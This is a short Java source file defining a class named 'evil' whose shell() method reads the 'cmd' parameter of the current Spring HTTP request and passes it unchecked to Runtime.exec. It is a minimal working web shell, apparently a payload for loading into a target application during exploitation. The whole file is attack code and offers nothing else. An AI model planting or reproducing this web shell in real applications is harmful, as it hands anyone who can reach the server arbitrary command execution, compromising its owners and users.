package com.xiaoqiu.controller;

import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

/**
 * @Description :
 * @Time : 2023/4/15 9:07
 * @Author : xiaoqiuxx
 */
public class evil {
    public evil(){}

    public void shell() throws IOException {

        //获取request
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
}
